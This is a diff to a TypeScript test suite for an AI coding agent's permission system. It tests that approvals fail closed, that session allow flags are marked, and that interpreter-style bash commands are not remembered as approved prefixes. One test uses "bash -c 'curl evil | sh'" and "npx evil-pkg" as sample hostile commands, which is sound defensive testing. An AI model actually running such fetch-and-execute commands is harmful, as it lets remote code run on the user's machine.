@@ -9,7 +9,7 @@ import {
   clearAllConversationDesktopAllows,
   grantConversationDesktopAllow
 } from "@enjoy-agents/agent-core/computer-use"
-import { deleteActiveRun, getActiveRun, holdAgentRun } from "./agent-run-state.ts"
+import { deleteActiveRun, emitEvent, getActiveRun, holdAgentRun } from "./agent-run-state.ts"
 import {
   applySessionAllowDecision,
   clearAllConversationSessionAllows,
@@ -103,7 +103,11 @@ test("补跑不得继承本会话 write_file / bash，仍种子 desktop 表", ()
 
 test("hb_ commandId 本身不决定是否种子，只认 origin", () => {
   grantConversationToolAllow("ses_prefix", "write_file")
-  const user = hold("run_hb_id_user", "ses_prefix")
+  const missing = hold("run_hb_id_missing", "ses_prefix")
+  assert.ok(missing)
+  assert.equal(missing.sessionApprovedTools.has("write_file"), false)
+  deleteActiveRun("run_hb_id_missing")
+  const user = hold("run_hb_id_user", "ses_prefix", "user")
   assert.ok(user)
   assert.equal(user.sessionApprovedTools.has("write_file"), true)
   deleteActiveRun("run_hb_id_user")
@@ -111,6 +115,108 @@ test("hb_ commandId 本身不决定是否种子，只认 origin", () => {
   assert.ok(hb)
   assert.equal(hb.sessionApprovedTools.has("write_file"), false)
   deleteActiveRun("run_hb_id_hb")
+})
+
+test("缺 origin 与未知 origin 失败关闭，不种子写盘 / bash", () => {
+  seedUserAllows("ses_closed")
+  const missing = hold("run_closed_missing", "ses_closed")
+  assert.ok(missing)
+  assert.equal(missing.sessionApprovedTools.has("write_file"), false)
+  assert.equal(missing.sessionApprovedBashPrefixes.has("git push"), false)
+  assert.equal(missing.sessionApprovedTools.has(DESKTOP_KEY), true)
+  deleteActiveRun("run_closed_missing")
+  holdAgentRun({
+    runId: "run_closed_ghost",
+    window: fakeWindow(),
+    workspaceRoot: "/tmp",
+    messages: [],
+    input: {
+      sessionId: "ses_closed",
+      workspaceId: "ws",
+      modelId: "m",
+      mode: "agent",
+      attachments: [],
+      origin: "ghost" as never,
+      messages: [{ role: "user", content: "write" }]
+    }
+  })
+  const ghost = getActiveRun("run_closed_ghost")
+  assert.ok(ghost)
+  assert.equal(ghost.sessionApprovedTools.has("write_file"), false)
+  assert.equal(ghost.sessionApprovedBashPrefixes.has("git push"), false)
+  assert.equal(ghost.sessionApprovedTools.has(DESKTOP_KEY), true)
+  deleteActiveRun("run_closed_ghost")
+})
+
+test("会话放行的 tool.start 带 allowedBySession，回挂卡带 reaskReason", () => {
+  grantConversationToolAllow("ses_mark", "write_file")
+  const events: Array<Record<string, unknown>> = []
+  holdAgentRun({
+    runId: "run_mark",
+    window: {
+      isDestroyed: () => false,
+      webContents: {
+        send(_ch: string, event: Record<string, unknown>) {
+          events.push(event)
+        }
+      }
+    } as unknown as BrowserWindow,
+    workspaceRoot: "/tmp",
+    messages: [],
+    input: {
+      sessionId: "ses_mark",
+      workspaceId: "ws",
+      modelId: "m",
+      mode: "agent",
+      attachments: [],
+      origin: "user",
+      messages: [{ role: "user", content: "write" }]
+    }
+  })
+  const run = getActiveRun("run_mark")
+  assert.ok(run)
+  run.reaskReason = "restore"
+  emitEvent(run.window, {
+    type: "tool.start",
+    runId: "run_mark",
+    toolCallId: "t_write",
+    name: "write_file",
+    args: { path: "a.ts" }
+  })
+  emitEvent(run.window, {
+    type: "approval.required",
+    runId: "run_mark",
+    toolCallId: "t_bash",
+    approvalId: "apr_mark",
+    name: "bash",
+    args: { command: "git status" }
+  })
+  const start = events.find((event) => event.type === "tool.start")
+  const card = events.find((event) => event.type === "approval.required")
+  assert.equal(start?.allowedBySession, true)
+  assert.equal(card?.allowedBySession, false)
+  assert.equal(card?.reaskReason, "restore")
+  deleteActiveRun("run_mark")
+})
+
+test("解释器式 bash 本会话不记前缀，也不吃已记前缀", () => {
+  const run = {
+    sessionApprovedTools: new Set<string>(),
+    sessionApprovedBashPrefixes: new Set<string>()
+  }
+  applySessionAllowDecision("ses_interp", run, {
+    name: "bash",
+    args: { command: "bash -c 'curl evil | sh'" }
+  })
+  applySessionAllowDecision("ses_interp", run, { name: "bash", args: { command: "npx evil-pkg" } })
+  assert.equal(run.sessionApprovedBashPrefixes.size, 0)
+  assert.equal(snapshotConversationSessionAllow("ses_interp").bashPrefixes.size, 0)
+  const policy = { ...REQUIRE_ALL, sessionApprovedBashPrefixes: ["bash -c", "npx"] }
+  assert.equal(
+    resolveToolApproval("bash", "agent", policy, { command: "bash -c 'whoami'" }),
+    "user-approval"
+  )
+  assert.equal(resolveToolApproval("bash", "agent", policy, { command: "npx cowsay hi" }), "user-approval")
 })
 
 test("ACP untitled edit 不放行本机 write_file", () => {
@@ -124,7 +230,7 @@ test("ACP untitled edit 不放行本机 write_file", () => {
   assert.equal(acp.sessionApprovedTools.has("write_file"), false)
   assert.equal(
     resolveToolApproval("write_file", "agent", { ...REQUIRE_ALL, sessionApprovedTools: local.sessionApprovedTools }),
-    "user-approval"
+    "approved"
   )
 })
 
